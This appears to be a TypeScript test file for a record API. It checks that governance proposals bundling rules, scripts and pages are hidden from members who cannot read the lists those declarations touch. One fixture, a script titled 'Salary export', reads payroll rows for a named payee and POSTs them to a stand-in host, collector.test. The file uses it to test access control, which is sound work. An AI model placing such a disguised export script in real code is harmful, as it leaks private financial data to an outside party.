/**
 * A `change` is held back from a caller who cannot read a list its declarations touch, as `automations` and `scripts`
 * hold back the rule and the script themselves (`loop/research-batch-thirty-eight-audit.md` finding 3).
 *
 * WHAT WAS MEASURED. `holds` read the list a change is about from `declaration_id` alone, and a change filed under a
 * rule's or a script's id named no list, so it went to every whole-record reader. A member at `write` held to `append`
 * on Money is one: `automations` and `scripts` both refused her Money's automation and the script that reads Money,
 * and `governance` handed her the proposal carrying both, from which Decide drew "Only when: payee is Omar and amount
 * more than 90000" and the source that posts Money's rows to `collector.test`. The same bundle filed under
 * `register.inbox` was refused at filing, so the proposal reached her only through the rule's name.
 */

import { test } from 'node:test';
import assert from 'node:assert/strict';

import { createRecordApi, type CallContext } from '../src/index.ts';
import { fixedClock, openSqlite } from '../../kernel/test/sqlite.ts';

const NOW = Date.UTC(2026, 8, 23, 12);
const owner: CallContext = { principal: { kind: 'person', id: 'p_owner', level: 'owner' } };
/** The audit's member: a whole-record reader at `write`, held to `append` on Money, refused `list money`. */
const member: CallContext = { principal: { kind: 'person', id: 'p_m', level: 'write' }, levels: { money: 'append' } };
/** Invited to Money and Inbox alone, and reads both: every list the bundle touches, and not the record as a whole. */
const both: CallContext = { principal: { kind: 'person', id: 'p_b', level: null }, registers: ['money', 'inbox'], levels: { money: 'read', inbox: 'read' } };
/** Invited to Inbox alone. */
const inboxOnly: CallContext = { principal: { kind: 'person', id: 'p_i', level: null }, registers: ['inbox'], levels: { inbox: 'read' } };

const reg = (id: string, name: string, fields: Record<string, unknown>[]) => ({
  id: `register.${id}`,
  kind: 'register' as const,
  body: { id, name, title: 'what', fields: [{ id: 'what', type: 'text', required: true }, ...fields] } as never,
});
const MONEY = reg('money', 'Money', [{ id: 'amount', type: 'int' }, { id: 'payee', type: 'text' }]);
const INBOX = reg('inbox', 'Inbox', []);
const INBOX2 = reg('inbox', 'Inbox', [{ id: 'from', type: 'text' }]);
const WATCH = {
  id: 'rule.omar-pay',
  kind: 'rule' as const,
  body: {
    rule: 'omar-pay',
    name: 'Omar pay',
    on: { written: { register: 'money', op: ['create'] } },
    when: 'payee is Omar and amount more than 90000',
    once_per: ['entry'],
    steps: [{ notify: { say: 'Omar was paid {{trigger.row.amount}}' } }],
  },
};
const PEEK = {
  id: 'script.peek',
  kind: 'script' as const,
  body: {
    script: 'peek',
    title: 'Salary export',
    runs: { every: '1d' },
    egress: ['https://collector.test'],
    keys: [],
    reads: ['money'],
    writes: [],
    source:
      "export default async function run(ctx) { const rows = await ctx.record.list('money', { field: 'payee', is: 'Omar' }); await ctx.fetch('https://collector.test/x', { method: 'POST', body: JSON.stringify(rows) }); }",
  },
};

type Out = { ok: boolean; value?: unknown; refusal?: { code: string; fix: string } };

async function record() {
  const sql = openSqlite();
  const api = await createRecordApi({ sql, clock: fixedClock(NOW) });
  assert.ok(api.kernel.createRecord({ id: 'rec_01JZ8QK3F7R2M9V4XN6TCB5HAD', slug: 'the-studio', name: 'The Studio', tz: 'UTC', locale: 'en', owner: { id: 'p_owner' } }).ok);
  assert.ok((await api.kernel.install([MONEY, INBOX])).ok);
  /* Whether `governance` hands this caller the open proposal asking `question`. */
  const shown = async (ctx: CallContext, question: string): Promise<boolean> => {
    const g = (await api.governance({ status: 'open' }, ctx)) as Out;
    assert.ok(g.ok, JSON.stringify(g));
    return (g.value as { question?: string }[]).some((s) => s.question === question);
  };
  const file = async (question: string, declaration_id: string, to: unknown) => {
    const filed = (await api.propose({ question, body_kind: 'change', body: { declaration_id, to } } as never, owner)) as Out;
    assert.ok(filed.ok, JSON.stringify(filed));
    return filed.value as { id: string };
  };
  return { sql, api, shown, file };
}

test("A CHANGE FILED UNDER A RULE'S NAME IS HELD TO THE LISTS ITS RULE AND SCRIPT TOUCH, and the owner still reads it", async () => {
  const { sql, api, shown, file } = await record();
  const filed = await file('Tidy the inbox?', 'rule.omar-pay', { declarations: [INBOX2, WATCH, PEEK] });

  assert.equal(await shown(owner, 'Tidy the inbox?'), true);
  assert.equal(await shown(member, 'Tidy the inbox?'), false, "a member refused Money's automations was handed a proposal drawing one");
  assert.equal(await shown(inboxOnly, 'Tidy the inbox?'), false);
  /* Somebody who reads every list it touches is shown it, as a change to one of those lists is shown to its readers. */
  assert.equal(await shown(both, 'Tidy the inbox?'), true);

  /* A question she may not read is one she may not decide, and she is told what a missing one is told. At `decide`, so
     the refusal is about the question and not about her level. */
  const decider: CallContext = { ...member, principal: { kind: 'person', id: 'p_m', level: 'decide' } };
  assert.equal(await shown(decider, 'Tidy the inbox?'), false);
  const d = (await api.decide({ id: filed.id, resolved_as: 'wont-fix', reason: 'No.' } as never, decider)) as Out;
  assert.equal(d.ok, false, JSON.stringify(d));
  assert.equal(d.refusal?.fix, `There is no suggestion called ${filed.id}.`);
  sql.close();
});

test("EACH DECLARATION IS READ AS ITS OWN LIST IS: a rule's row and the lists its steps reach, a script's reads and writes", async () => {
  const { sql, shown, file } = await record();
  /* A rule on Inbox that files a row in Money: its row list is hers, the list it writes into is not. */
  const into = {
    id: 'rule.file-it',
    kind: 'rule' as const,
    body: { rule: 'file-it', register: 'inbox', once_per: ['entry'], then: [{ create: { register: 'money', bound: 1, fields: { what: 'from the inbox' } } }] },
  };
  await file('File the inbox into Money?', 'rule.file-it', into);
  /* A script that reads nothing and writes into Money. */
  const writes = { id: 'script.post', kind: 'script' as const, body: { ...PEEK.body, script: 'post', reads: [], writes: ['money'] } };
  await file('Post into Money?', 'script.post', writes);
  /* A rule that stays on Inbox. */
  const stays = { id: 'rule.seen', kind: 'rule' as const, body: { rule: 'seen', register: 'inbox', then: [{ tag: 'seen' }] } };
  await file('Tag the inbox?', 'rule.seen', stays);

  for (const q of ['File the inbox into Money?', 'Post into Money?']) {
    assert.equal(await shown(member, q), false, q);
    assert.equal(await shown(inboxOnly, q), false, q);
    assert.equal(await shown(owner, q), true, q);
  }
  assert.equal(await shown(member, 'Tag the inbox?'), true);
  assert.equal(await shown(inboxOnly, 'Tag the inbox?'), true);
  sql.close();
});

test('A RULE WITH NO ROW AND A SCRIPT THAT TOUCHES NO LIST GO WHERE automations AND scripts SEND THEM: to a caller who reads every list', async () => {
  const { sql, shown, file } = await record();
  const clock = { id: 'rule.nightly', kind: 'rule' as const, body: { rule: 'nightly', on: { every: '1d' }, steps: [{ notify: { say: 'Night.' } }] } };
  await file('Say good night?', 'rule.nightly', clock);
  const ping = { id: 'script.ping', kind: 'script' as const, body: { ...PEEK.body, script: 'ping', reads: [], writes: [] } };
  await file('Ping the collector?', 'script.ping', ping);
  const whole: CallContext = { principal: { kind: 'person', id: 'p_w', level: 'write' } };
  for (const q of ['Say good night?', 'Ping the collector?']) {
    assert.equal(await shown(owner, q), true, q);
    assert.equal(await shown(whole, q), true, `${q}: a whole-record reader who reads every list`);
    assert.equal(await shown(member, q), false, `${q}: a member held to append on Money`);
    assert.equal(await shown(inboxOnly, q), false, `${q}: a member invited to one list`);
  }
  sql.close();
});

test('A CHANGE TO A LIVE RULE IS HELD TO THE LISTS OF THE ONE IT REPLACES AS WELL', async () => {
  const { sql, api, shown, file } = await record();
  assert.ok((await api.kernel.install([WATCH])).ok);
  /* Moved off Money onto Inbox: accepting it changes what Money's rows set off, which is not hers to read. */
  const moved = { ...WATCH, body: { ...WATCH.body, on: { written: { register: 'inbox', op: ['create'] } }, when: undefined } };
  await file('Move Omar pay to the inbox?', 'rule.omar-pay', moved);
  assert.equal(await shown(owner, 'Move Omar pay to the inbox?'), true);
  assert.equal(await shown(member, 'Move Omar pay to the inbox?'), false);
  assert.equal(await shown(inboxOnly, 'Move Omar pay to the inbox?'), false);
  sql.close();
});

/* A PAGE BESIDE THE RULE IS STILL ABOUT THE WHOLE RECORD. `changeTouches` reads lists off rules, scripts and registers
   and marks anything else `whole`; with that line removed every other case here stayed green, and a bundle under a rule
   on Inbox that also carries a page went to a member invited to Inbox alone. Before `changeTouches` the whole bundle
   went only to whole-record readers, and a page is still that. */
test('A BUNDLE UNDER A RULE THAT ALSO CARRIES A PAGE STILL NEEDS A WHOLE-RECORD READER', async () => {
  const { sql, shown, file } = await record();
  const stays = { id: 'rule.seen', kind: 'rule' as const, body: { rule: 'seen', register: 'inbox', then: [{ tag: 'seen' }] } };
  const page = {
    id: 'page.inbox',
    kind: 'page' as const,
    body: { page: 'inbox', title: 'Inbox', requires: ['register.inbox'], blocks: [{ kind: 'table', source: 'register.inbox', span: 12, empty: 'Nothing in.' }] },
  };
  await file('Tag the inbox and give it a page?', 'rule.seen', { declarations: [stays, page] });
  assert.equal(await shown(owner, 'Tag the inbox and give it a page?'), true);
  assert.equal(await shown(inboxOnly, 'Tag the inbox and give it a page?'), false, 'a member invited to Inbox alone was handed a page');
  sql.close();
});
